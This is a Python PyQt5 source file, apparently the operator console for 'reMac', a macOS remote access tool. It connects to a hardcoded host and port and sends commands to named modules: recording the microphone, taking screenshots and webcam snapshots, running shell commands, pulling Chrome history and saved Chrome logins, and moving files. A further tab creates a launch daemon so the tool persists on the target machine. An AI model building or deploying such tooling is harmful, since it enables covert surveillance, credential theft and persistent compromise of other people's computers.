import os
import sys
import socket
import xml.dom.minidom

from PyQt5.QtWidgets import QApplication, QLabel, QWidget, QVBoxLayout, QHBoxLayout, QPushButton, \
    QTextEdit, QLineEdit, QComboBox, QTabWidget, QMainWindow, QAction, QGroupBox
from PyQt5.QtCore import QThread, QSettings, QFile, QTextStream
from PyQt5 import QtGui, QtCore

from ui.libs.LineEdit import LineEdit
from apps.server.reMac_server import reMac_server
from apps.client.reMac_client import reMac_client
from ui.libs.StartServerWorker import StartServerWorker
from ui.libs.StartClientWorker import StartClientWorker
from ui.help_dialog import help_dialog
from ui.pref_dialog import pref_dialog
from apps.libs.reMac_createDeamon import reMac_createDeamon

import config

app = QApplication([])
txtOutputServer = QTextEdit()
txtOutputClient = QTextEdit()
txtOutputLaunchDeamon = QTextEdit()
txtHost = QLineEdit("192.168.0.49")
txtPort = QLineEdit("6890")
settings = QSettings("kimhauser.ch", "reMacQt5");
txtLdKey = QLineEdit("ch.kimhauser.macos.remac.launchdeamon")
txtLdProgram = QLineEdit("remac_lanuchdeamon")


class reMacQtApp(QMainWindow):

    sentCommands = []
    myreMac_server = reMac_server()
    myreMac_client = reMac_client()
    myreMac_createDeamon = reMac_createDeamon()

    cmd_start_server = QPushButton('Start Server')
    cmd_send_command = QPushButton('Send command')

    cmb_modules = QComboBox()
    txtCmdToSend = LineEdit()
    stsBar = None

    def __init__(self):
        super().__init__()
        self.initUI()

    def initUI(self):

        self.prefWin.initUI(settings)

        window = QWidget()
        wdgtServer = QWidget()
        layoutServer = QVBoxLayout()
        layoutServer.setSpacing(0)
        wdgtClient = QWidget()
        layoutClient = QVBoxLayout()
        layoutClient.setSpacing(0)
        layoutModuleCommand = QVBoxLayout()
        layoutModuleCommand.setSpacing(0)

        wdgtLaunchDeamon = QWidget()
        layoutLaunchDeamon = QVBoxLayout()
        # layoutModuleCommand = QVBoxLayout()

        layout = QVBoxLayout()
        self.setFixedWidth(725)

        layConn = QHBoxLayout()
        wdgtConn = QGroupBox("Connection:")
        wdgtConn.setFont(QtGui.QFont("Arial", 13))
        wdgtConn.setLayout(layConn)

        layIP = QVBoxLayout()
        wdgtIP = QWidget()
        wdgtIP.setFixedWidth(500)
        wdgtIP.setLayout(layIP)
        layIP.addWidget(QLabel('IP address:'))
        layIP.addWidget(txtHost)
        layIP.setSpacing(0)
        layConn.addWidget(wdgtIP)
        layPort = QVBoxLayout()
        wdgtPort = QWidget()
        wdgtPort.setLayout(layPort)
        layPort.addWidget(QLabel('Port:'))
        layPort.addWidget(txtPort)
        layPort.setSpacing(0)
        layConn.addWidget(wdgtPort)
        layConn.setSpacing(0)
        layout.addWidget(wdgtConn)
        layout.setSpacing(0)
        wdgtConn.setContentsMargins(0, 5, 0, 0)

        self.cmd_start_server.clicked.connect(self.runStartServer)
        layoutServer.addWidget(self.cmd_start_server)

        cmd_start_client = QPushButton('Start Client')
        cmd_start_client.clicked.connect(self.runStartClient)
        layoutClient.addWidget(cmd_start_client)
        layoutClient.addSpacing(20)
        wdgtModuleSendCmd = QGroupBox("Send command to server:")
        wdgtModuleSendCmd.setLayout(layoutModuleCommand)

        self.cmb_modules.addItem("Hello World", "hw")
        self.cmb_modules.addItem("Module help", "mh")
        self.cmb_modules.addItem("Copy / paste clipboard", "cb")
        self.cmb_modules.addItem("Record microphone", "rm")
        self.cmb_modules.addItem("Screenshot", "sc")
        self.cmb_modules.addItem("Shell command", "sh")
        self.cmb_modules.addItem("Webcam snapshot", "wc")
        self.cmb_modules.addItem("Chrome history", "ch")
        self.cmb_modules.addItem("Chrome logins", "cl")
        self.cmb_modules.addItem("System information", "in")
        self.cmb_modules.addItem("Download file", "dl")
        self.cmb_modules.addItem("Upload file", "ul")

        self.cmb_modules.currentIndexChanged.connect(self.moduleCmbSel)

        layoutModuleCommand.addWidget(QLabel('Module:'))
        layoutModuleCommand.addWidget(self.cmb_modules)
        layoutModuleCommand.addWidget(QLabel('Command / Parameter:'))
        layoutSendCmd = QHBoxLayout()
        wdgtSendCmd = QWidget()
        wdgtSendCmd.setLayout(layoutSendCmd)

        layoutSendCmd.addWidget(self.txtCmdToSend)
        self.txtCmdToSend.setToolTip("You can also drop a file to upload it to the server!")
        self.txtCmdToSend.setFocus()
        self.cmd_send_command.clicked.connect(self.sendCommand)

        self.txtCmdToSend.returnPressed.connect(self.cmd_send_command.click)
        self.txtCmdToSend.upPressed.connect(self.keyUpPressed)
        self.txtCmdToSend.downPressed.connect(self.keyDownPressed)

        layoutSendCmd.addWidget(self.cmd_send_command)
        layoutModuleCommand.addWidget(wdgtSendCmd)

        layoutClient.addWidget(wdgtModuleSendCmd)

        tabWdgt = QTabWidget()
        tabWdgt.setFont(QtGui.QFont("Arial", 13))
        layoutServerOutputLine = QHBoxLayout()
        layoutServerOutputLine .addWidget(QLabel('Output:'))
        cmd_clear_server_output = QPushButton('')
        cmd_clear_server_output.setIcon(QtGui.QIcon('res/images/empty-set.png'))
        cmd_clear_server_output.setIconSize(QtCore.QSize(16, 16))
        cmd_clear_server_output.setFixedWidth(48)
        cmd_clear_server_output.clicked.connect(self.clear_output_server)
        layoutServerOutputLine.addWidget(cmd_clear_server_output)
        layoutServerOutputLine.setSpacing(0)
        wdgtServerOutputLine = QWidget()
        wdgtServerOutputLine.setFixedHeight(64)
        wdgtServerOutputLine.setLayout(layoutServerOutputLine)
        wdgtServerOutputLine.setContentsMargins(0, 0, 0, 0)
        layoutServer.addWidget(wdgtServerOutputLine)

        txtOutputServer.setFontFamily("Courier")
        txtOutputServer.setFontPointSize(14)
        txtOutputServer.setFontWeight(25)
        txtOutputServer.setReadOnly(True)
        layoutServer.addWidget(txtOutputServer)
        wdgtServer.setLayout(layoutServer)
        tabWdgt.addTab(wdgtServer, QtGui.QIcon('res/images/server.png'), "Server")


        layoutClientOutputLine = QHBoxLayout()
        layoutClientOutputLine.addWidget(QLabel('Output:'))
        cmd_clear_client_output = QPushButton('')
        cmd_clear_client_output.setIcon(QtGui.QIcon('res/images/empty-set.png'))
        cmd_clear_client_output.setIconSize(QtCore.QSize(16, 16))
        cmd_clear_client_output.setFixedWidth(48)
        cmd_clear_client_output.clicked.connect(self.clear_output_client)
        layoutClientOutputLine.addWidget(cmd_clear_client_output)
        layoutClientOutputLine.setSpacing(0)
        wdgtClientOutputLine = QWidget()
        wdgtClientOutputLine.setFixedHeight(64)
        wdgtClientOutputLine.setLayout(layoutClientOutputLine)
        wdgtClientOutputLine.setContentsMargins(0, 0, 0, 0)
        layoutClient.addWidget(wdgtClientOutputLine)
        txtOutputClient.setFontFamily("Courier")
        txtOutputClient.setFontPointSize(14)
        txtOutputClient.setReadOnly(True)
        txtOutputClient.setFixedHeight(160)
        layoutClient.addWidget(txtOutputClient)
        wdgtClient.setLayout(layoutClient)
        idx = tabWdgt.addTab(wdgtClient, QtGui.QIcon('res/images/hosting.png'), "Client")

        # layLaunchDeamon = QVBoxLayout()
        # wdgtLaunchDeamon = QWidget()
        # layLaunchDeamon.addWidget(wdgtLaunchDeamon)
        #
        layoutLaunchCtrlOutputLine = QHBoxLayout()
        layoutLaunchCtrlOutputLine.addWidget(QLabel('Output:'))

        cmd_clear_launchdeamon_output = QPushButton('')
        cmd_clear_launchdeamon_output.setIcon(QtGui.QIcon('res/images/empty-set.png'))
        cmd_clear_launchdeamon_output.setIconSize(QtCore.QSize(16, 16))
        cmd_clear_launchdeamon_output.setFixedWidth(48)
        # cmd_clear_launchdeamon_output.clicked.connect(self.clear_output_server)
        layoutLaunchCtrlOutputLine.addWidget(cmd_clear_launchdeamon_output)

        wdgtLaunchCtrlOutputLine = QWidget()
        wdgtLaunchCtrlOutputLine.setContentsMargins(0, 0, 0, 0)
        wdgtLaunchCtrlOutputLine.setLayout(layoutLaunchCtrlOutputLine)
        layoutLaunchCtrlOutputLine.setContentsMargins(0, 0, 0, 0)
        layoutLaunchCtrlOutputLine.setSpacing(0)
        # layoutLaunchCtrlOutputLine.setMargin(0)
        cmd_create_launch_deamon = QPushButton('Create Launch deamon')
        cmd_create_launch_deamon.clicked.connect(self.create_launch_deamon)

        layoutLaunchCtrlLdKey = QHBoxLayout()
        layoutLaunchCtrlLdKey.addWidget(QLabel("Key:"))
        layoutLaunchCtrlLdKey.addWidget(txtLdKey)
        wdgtLaunchCtrlLdKey = QWidget()
        wdgtLaunchCtrlLdKey.setContentsMargins(0, 0, 0, 0)
        layoutLaunchCtrlLdKey.setContentsMargins(0, 0, 0, 0)
        layoutLaunchCtrlLdKey.setSpacing(0)
        # layoutLaunchCtrlLdKey.setMargin(0)
        wdgtLaunchCtrlLdKey.setLayout(layoutLaunchCtrlLdKey)

        layoutLaunchCtrlLdProgram = QHBoxLayout()
        layoutLaunchCtrlLdProgram.addWidget(QLabel("Program:"))
        layoutLaunchCtrlLdProgram.addWidget(txtLdProgram)

        wdgtLaunchCtrlLdProgramm = QWidget()
        wdgtLaunchCtrlLdProgramm.setContentsMargins(0, 0, 0, 0)
        layoutLaunchCtrlLdProgram.setContentsMargins(0, 0, 0, 0)
        layoutLaunchCtrlLdProgram.setSpacing(0)
        # layoutLaunchCtrlLdProgram.setMargin(0)
        wdgtLaunchCtrlLdProgramm.setLayout(layoutLaunchCtrlLdProgram)

        layoutLaunchDeamon.addWidget(wdgtLaunchCtrlLdKey)
        layoutLaunchDeamon.addWidget(wdgtLaunchCtrlLdProgramm)
        layoutLaunchDeamon.addWidget(cmd_create_launch_deamon)
        layoutLaunchDeamon.addWidget(wdgtLaunchCtrlOutputLine)
        layoutLaunchDeamon.addWidget(txtOutputLaunchDeamon)

        wdgtLaunchDeamon.setLayout(layoutLaunchDeamon)
        idx = tabWdgt.addTab(wdgtLaunchDeamon, QtGui.QIcon('res/images/demon.png'), "Launch deamon")


        layout.addWidget(tabWdgt)

        window.setLayout(layout)
        exitAct = QAction(QtGui.QIcon('res/images/open.png'), ' &Help', self)
        prefAct = QAction('&Preferences', self, triggered=self.showPref)
        quitAct = QAction('&Quit reMac', self,  triggered=self.exitApp)

        menubar = self.menuBar()
        menubar.setNativeMenuBar(False)
        fileMenu = menubar.addMenu('&File')
        fileMenu.addAction(prefAct)
        fileMenu.addSeparator()
        fileMenu.addAction(quitAct)

        helpMenu = menubar.addMenu('&Help')
        helpMenu.addAction(exitAct)
        helpMenu.triggered[QAction].connect(self.showHelp)

        self.setCentralWidget(window)
        self.stsBar = self.statusBar()
        self.setWindowTitle("reMac v0.0.1 - Qt5-App")
        self.show()
        app.exec_()
        # self.stsBar.showMessage("reMac v0.0.1 suite started ...", STATUSBAR_MSG_MSECS)

    global STATUSBAR_MSG_MSECS
    STATUSBAR_MSG_MSECS = 3000

    hlpWin = help_dialog()
    prefWin = pref_dialog()

    def create_launch_deamon(self):
        arrRet = self.myreMac_createDeamon.createDeamon(txtLdKey.text(), txtLdProgram.text())
        txtOutputLaunchDeamon.setPlainText(arrRet[0])

    def moduleCmbSel(self):
        self.txtCmdToSend.setText(self.cmb_modules.currentData())

    def exitApp(self):
        sys.exit(0)

    def showPref(self):
        self.prefWin.showDialog()

    def showHelp(self):
        # help_file = open(f'help.html', 'rb')
        # help_txt = help_file.read()
        self.hlpWin.initUI()

    def serverStarted(self, ok):
        conHost = "192.168.0.49"
        conPort = "6890"

        if ok == 2:
            self.cmd_start_server.setText("Stop Server")
            self.log_output_server(f"> reMac Server started successfully - Listening on: {conHost}:{conPort}", True)

    def runStartServer(self):
        if self.cmd_start_server.text() == "Stop Server":
            print("Stopping server!!!")
            self.myreMac_server.stop_server()
            self.thread.quit()
            self.cmd_start_server.setText("Start Server")
            return

        # Step 2: Create a QThread object
        self.thread = QThread()
        # Step 3: Create a worker object
        self.worker = StartServerWorker(self)
        # Step 4: Move worker to the thread
        self.worker.moveToThread(self.thread)
        # Step 5: Connect signals and slots
        self.thread.started.connect(self.worker.run)
        self.worker.finished.connect(self.thread.quit)
        self.worker.finished.connect(self.worker.deleteLater)
        self.thread.finished.connect(self.thread.deleteLater)
        self.thread.finished.connect(self.serverStarted)
        self.worker.progress.connect(self.serverStarted)
        self.worker.progressng.connect(self.log_output_server)
        self.thread.start()


        self.thread.finished.connect(
            lambda: self.serverStarted(True)
        )

    def runStartClient(self, cmd=""):
        # Step 2: Create a QThread object
        self.threadClient = QThread()
        # Step 3: Create a worker object
        if cmd == False:
            cmd = ""
        self.workerClient = StartClientWorker(self, cmd)
        # Step 4: Move worker to the thread
        self.workerClient.moveToThread(self.threadClient)
        # Step 5: Connect signals and slots
        self.threadClient.started.connect(self.workerClient.run)
        self.workerClient.progress.connect(self.log_output_client)
        self.threadClient.start()

    def startServer(self, prg, prgng):
        shost = txtHost.text()
        sport = txtPort.text()
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        sRet = f'#========================================================================#\n'
        sRet += f'| \n'
        sRet += f'| {config.REMAC_APP_NAME} Server - {config.REMAC_APP_DESC}\n|\n'
        sRet += f'| - IP: {shost}\n'
        sRet += f'| - Port: {sport}\n|\n'
        sRet += f'| Created by {config.REMAC_APP_AUTHOR}, (C.) {config.REMAC_APP_DATE}\n'
        sRet += f'| \n'
        sRet += f'| Link: {config.REMAC_APP_LINK}\n'
        sRet += f'| Email: {config.REMAC_APP_EMAIL}\n'
        sRet += f'| \n'
        sRet += f'| Description:\n'
        sRet += f'| You can start the CLI version of the server (reMac_server.py) with\n'
        sRet += f'| Host-IP and Host-Port as parameter.\n'
        sRet += f'| I.e. python reMac_server.py 127.0.0.1 1234. This will start the server\n'
        sRet += f'| on localhost listening at port 1234 for connections.\n'
        sRet += f'| \n'
        sRet += f'| Website:\n'
        sRet += f'| - https://github.com/jetedonner/ch.kimhauser.python.remacQt5\n'
        sRet += f'| - http://kimhauser.ch/index.php/projects/remac\n'
        sRet += f'| \n'
        sRet += f'| Credits:\n'
        for i, (k, v) in enumerate(config.REMAC_APP_CREDITS.items()):
        # for txt, link in config.REMAC_APP_CREDITS:
            sRet += f'| - {k}: {v}\n'
        # sRet += f'| - ...\n'
        # sRet += f'| - ...\n'
        sRet += f'| \n'
        sRet += f'#========================================================================#\n'
        sRet += f' \n'
        sRet += f'Starting reMacApp Server: {shost}:{sport} ...'
        prgng.emit(sRet)
        self.myreMac_server.start_server(shost, sport, prg, prgng)

    clientPrg = None

    def startClient(self, prg, cmd=""):
        self.clientPrg = prg
        shost = txtHost.text()
        sport = txtPort.text()
        prg.emit(f"Starting reMacApp Client: {shost}:{sport} ...")
        # self.stsBar.showMessage(f"Starting reMacApp Client: {shost}:{sport} ...", STATUSBAR_MSG_MSECS)
        msg = ""
        params = ""
        if cmd != "":
            args = cmd.split(" ", 1)
            if len(args) >= 1:
                msg = args[0]
                if len(args) >= 2:
                    params = args[1]


        self.myreMac_client.start_client(shost, sport, prg, msg, params)

    def sendCommand(self):
        cmd2Send = self.txtCmdToSend.text().strip()
        if cmd2Send == "":
            return
        self.stsBar.showMessage("Sending command ... ", STATUSBAR_MSG_MSECS)
        self.sentCommands.append(cmd2Send)
        self.txtCmdToSend.setText("")
        self.sentCmdListCursor = len(self.sentCommands)

        shost = txtHost.text()
        sport = txtPort.text()

        self.log_output_client(f'Sending command "{cmd2Send}" to: {shost}:{sport} ...')
        cmd2Send = cmd2Send.lower()
        if cmd2Send.startswith("sh"):
            self.runStartClient(cmd2Send)
        else:
            # self.clientPrg.emit(f"Starting reMacApp Client: {shost}:{sport} ...")
            self.myreMac_client.start_client(shost, sport, self.clientPrg, cmd2Send)

    sentCmdListCursor = 0

    def keyDownPressed(self):
        if self.sentCmdListCursor < len(self.sentCommands) - 1:
            self.sentCmdListCursor += 1
            self.txtCmdToSend.setText(self.sentCommands[self.sentCmdListCursor])

    def keyUpPressed(self):
        if self.sentCmdListCursor > 0:
            self.sentCmdListCursor -= 1
            self.txtCmdToSend.setText(self.sentCommands[self.sentCmdListCursor])

    # def keyDownPressed(self):
    #     if self.sentCmdListCursor < -1:
    #         self.sentCmdListCursor += 1
    #         self.txtCmdToSend.setText(self.sentCommands[self.sentCmdListCursor])
    #
    # def keyUpPressed(self):
    #     if (self.sentCmdListCursor) * -1 <= len(self.sentCommands):
    #         self.txtCmdToSend.setText(self.sentCommands[self.sentCmdListCursor])
    #         self.sentCmdListCursor -= 1

    def clear_output_server(self):
        txtOutputServer.setText("")

    def log_output_server(self, msg, set_status_bar=False):
        txtOutputServer.append(msg)
        txtOutputServer.verticalScrollBar().setValue(txtOutputServer.verticalScrollBar().maximum())
        if set_status_bar:
            self.stsBar.showMessage(msg, STATUSBAR_MSG_MSECS)

    def clear_output_client(self):
        txtOutputClient.setText("")

    def log_output_client(self, msg, set_status_bar=False):
        txtOutputClient.append(msg)
        txtOutputClient.verticalScrollBar().setValue(txtOutputClient.verticalScrollBar().maximum())
        if set_status_bar:
            self.stsBar.showMessage(msg, STATUSBAR_MSG_MSECS)
        else:
            self.stsBar.showMessage("Server answer returned ...", STATUSBAR_MSG_MSECS)
